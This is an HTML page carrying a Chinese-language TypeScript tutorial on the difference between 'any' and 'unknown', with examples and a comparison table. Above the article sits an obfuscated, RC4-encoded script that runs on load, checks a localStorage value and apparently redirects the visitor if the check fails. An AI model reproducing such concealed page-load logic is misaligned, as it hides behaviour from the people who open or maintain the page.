<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x3695(l,n){var o=_0x3d35();return(_0x3695=function(n,s){var a=o[n-=500];void 0===_0x3695.fmZgDI&&(_0x3695.OLXJKg=function(n,s){var a,t=[],l=0,o="";for(n=(n=>{for(var s,a,t="",l="",o=0,e=0;a=n.charAt(e++);~a&&(s=o%4?64*s+a:a,o++%4)&&(t+=String.fromCharCode(255&s>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,c=t.length;r<c;r++)l+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(l)})(n),e=0;e<256;e++)t[e]=e;for(e=0;e<256;e++)l=(l+t[e]+s.charCodeAt(e%s.length))%256,a=t[e],t[e]=t[l],t[l]=a;for(var e=0,l=0,r=0;r<n.length;r++)a=t[e=(e+1)%256],t[e]=t[l=(l+t[e])%256],t[l]=a,o+=String.fromCharCode(n.charCodeAt(r)^t[(t[e]+t[l])%256]);return o},l=arguments,_0x3695.fmZgDI=!0);var n=n+o[0],t=l[n];return t?a=t:(void 0===_0x3695.jYzhqH&&(_0x3695.jYzhqH=!0),a=_0x3695.OLXJKg(a,s),l[n]=a),a})(l,n)}var _0xf53736=_0x3695;function _0x3d35(){var n=["W74zmc0qgCk/ACkev8kBWOm","W7K7bfn1WPyiWP/cI8k9D8kGWRq","fCodWRtdImoZW4OeWPK8zColWPO","W7hcNrHuw2pdK8oXW6pdKSkKW6pcLa","Dtf0d8olq8ohg8kIW4yFgse","W6aXFWlcQSkKFgjBtbvBCq","o3RcUCkwW74wWQ7cGse","W4lcQCk7deJdI8ohW4BdICkrcCovDW","WR7dJCoxW5VcM1GvWOpcRaecnJpdSG","cJ1YW4fitSomW4S","aXhcNYKOW7/dHrJdQSo2tmo9WPe","WRPNra8NW4nA","WOZdHSk5kt7cKhy","vxJdLmk7Emk0WPfFyCk9bNy","mmktkMzDW5pdRW","FL3dGmo1sHTG","W7H9WPLhb8k3ceTwbSk0A8oJtq","xG3cLNpcRM/cSG","wYlcMCoMkCojWQG","WOJcUSoiD2ldOGVdVapdNGePAW","W75LqhTlA8kP","WR3cRSkbWRRdLJ1t","E8kOW4JcLmkdDSojWRddRs/dJKje","WPVcIYtdTCkTxMe8bHmtW5O","cMZcQCkaW7q","WOddHCkqdaJcUNS","WRJdILbkW4/dVCobC27cUmkCW73cQCk9WPhdMx9yW7hcJSohiKWVW7rq","WQK4W403W4O1da"];return(_0x3d35=function(){return n})()}if((()=>{for(var n=_0x3695,s=_0x3d35();;)try{if(441585==+parseInt(n(526,"EEOF"))+parseInt(n(517,"zls@"))/2*(parseInt(n(516,"14eD"))/3)+parseInt(n(510,"J7ni"))/4+-parseInt(n(515,"HysJ"))/5*(-parseInt(n(522,"HysJ"))/6)+parseInt(n(504,"KbZf"))/7*(parseInt(n(521,"14eD"))/8)+parseInt(n(500,"HysJ"))/9*(parseInt(n(508,"m&()"))/10)+-parseInt(n(519,"ij!I"))/11)break;s.push(s.shift())}catch(n){s.push(s.shift())}})(),localStorage[_0xf53736(502,"p4f%")](_0xf53736(509,"@JWb"))!=_0xf53736(527,"@JWb"))throw window[_0xf53736(512,"LeSn")][_0xf53736(514,"KbZf")](_0xf53736(501,"x1eM")),Error();document.title="ts 中any和unknown有什么区别",document.getElementById("article").innerHTML='<div><p>在 TypeScript 中，<code>any</code> 和 <code>unknown</code> 是两种特殊的类型，用于处理动态类型或不确定类型的值。它们之间的主要区别在于类型安全性和使用时的灵活性。以下是详细的比较和解释：</p>\n<hr>\n<h3><strong>1. <code>any</code> 类型</strong></h3>\n<ul>\n<li><strong>定义</strong>  ：<code>any</code> 类型表示可以是任何类型的值。使用 <code>any</code> 类型时，TypeScript 会跳过对该值的类型检查。</li>\n<li><strong>特点</strong>  ：\n<ul>\n<li><strong>无类型检查</strong>  ：可以赋值给任何类型，也可以从任何类型赋值。</li>\n<li><strong>灵活性高</strong>  ：可以在 <code>any</code> 类型的变量上调用任意方法或访问任意属性，而不会引发编译错误。</li>\n<li><strong>安全性低</strong>  ：由于跳过了类型检查，可能导致运行时错误。</li>\n</ul>\n</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">any</span>;\n\nvalue = <span class="hljs-number">42</span>;           <span class="hljs-comment">// 可以赋值为 number</span>\nvalue = <span class="hljs-string">&quot;Hello&quot;</span>;      <span class="hljs-comment">// 可以赋值为 string</span>\nvalue = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 可以赋值为 boolean</span>\n\n<span class="hljs-keyword">let</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = value; <span class="hljs-comment">// 不会报错，但可能在运行时出错</span>\n</code></pre>\n<hr>\n<h3><strong>2. <code>unknown</code> 类型</strong></h3>\n<ul>\n<li><strong>定义</strong>  ：<code>unknown</code> 类型表示未知类型的值。与 <code>any</code> 不同，<code>unknown</code> 类型在赋值给其他类型之前需要进行类型检查。</li>\n<li><strong>特点</strong>  ：\n<ul>\n<li><strong>类型安全</strong>  ：不能直接赋值给其他类型，也不能直接调用方法或访问属性，除非先进行类型断言或类型检查。</li>\n<li><strong>灵活性低</strong>  ：需要显式地处理类型，增加了代码的安全性。</li>\n<li><strong>推荐使用</strong>  ：在不确定类型的情况下，<code>unknown</code> 比 <code>any</code> 更安全。</li>\n</ul>\n</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">unknown</span>;\n\nvalue = <span class="hljs-number">42</span>;           <span class="hljs-comment">// 可以赋值为 number</span>\nvalue = <span class="hljs-string">&quot;Hello&quot;</span>;      <span class="hljs-comment">// 可以赋值为 string</span>\nvalue = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 可以赋值为 boolean</span>\n\n<span class="hljs-comment">// let num: number = value; // 错误：不能将类型 &#x27;unknown&#x27; 分配给类型 &#x27;number&#x27;</span>\n\n<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;number&quot;</span>) {\n  <span class="hljs-keyword">let</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = value; <span class="hljs-comment">// 正确：经过类型检查后赋值</span>\n}\n</code></pre>\n<hr>\n<h3><strong>3. 主要区别</strong></h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th><code>any</code></th>\n<th><code>unknown</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>类型检查</strong></td>\n<td>无类型检查，跳过所有类型检查</td>\n<td>需要显式类型检查或断言</td>\n</tr>\n<tr>\n<td><strong>安全性</strong></td>\n<td>低，可能导致运行时错误</td>\n<td>高，需要显式处理类型</td>\n</tr>\n<tr>\n<td><strong>灵活性</strong></td>\n<td>高，可以随意赋值和使用</td>\n<td>低，需要类型检查后才能使用</td>\n</tr>\n<tr>\n<td><strong>使用场景</strong></td>\n<td>适用于快速原型或绕过类型系统</td>\n<td>适用于处理不确定类型的值</td>\n</tr>\n<tr>\n<td><strong>推荐程度</strong></td>\n<td>不推荐，除非必要</td>\n<td>推荐，特别是在类型不确定时</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3><strong>4. 使用建议</strong></h3>\n<ul>\n<li><strong>避免使用 <code>any</code></strong>  ：\n<ul>\n<li>除非在快速原型开发或需要绕过类型系统的情况下，否则应尽量避免使用 <code>any</code>。</li>\n<li>使用 <code>any</code> 会失去 TypeScript 的类型安全优势，可能导致难以发现的运行时错误。</li>\n</ul>\n</li>\n<li><strong>优先使用 <code>unknown</code></strong>  ：\n<ul>\n<li>当处理不确定类型的值时，应优先使用 <code>unknown</code>。</li>\n<li>使用 <code>unknown</code> 可以确保在赋值或使用之前进行类型检查，提高代码的安全性。</li>\n</ul>\n</li>\n<li><strong>类型断言和类型检查</strong>  ：\n<ul>\n<li>在使用 <code>unknown</code> 类型时，可以使用类型断言（<code>as</code> 关键字）或类型检查（<code>typeof</code>、<code>instanceof</code> 等）来确保类型安全。</li>\n</ul>\n</li>\n</ul>\n<h4><strong>类型断言示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">unknown</span>;\n\nvalue = <span class="hljs-string">&quot;Hello, TypeScript!&quot;</span>;\n\n<span class="hljs-comment">// 使用类型断言</span>\n<span class="hljs-keyword">let</span> <span class="hljs-attr">str</span>: <span class="hljs-built_in">string</span> = value <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">toUpperCase</span>()); <span class="hljs-comment">// 输出：HELLO, TYPESCRIPT!</span>\n</code></pre>\n<h4><strong>类型检查示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">unknown</span>;\n\nvalue = <span class="hljs-number">42</span>;\n\n<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&quot;number&quot;</span>) {\n  <span class="hljs-keyword">let</span> <span class="hljs-attr">num</span>: <span class="hljs-built_in">number</span> = value;\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>)); <span class="hljs-comment">// 输出：42.00</span>\n}\n</code></pre>\n<hr>\n<h3><strong>总结</strong></h3>\n<ul>\n<li><strong><code>any</code></strong>  ：跳过类型检查，灵活性高但安全性低，不推荐使用。</li>\n<li><strong><code>unknown</code></strong>  ：需要显式类型检查或断言，安全性高，推荐使用。</li>\n</ul>\n<p>在 TypeScript 开发中，应优先使用 <code>unknown</code> 来处理不确定类型的值，以保持类型安全并提高代码的可靠性。</p>\n</div>'</script></body></html>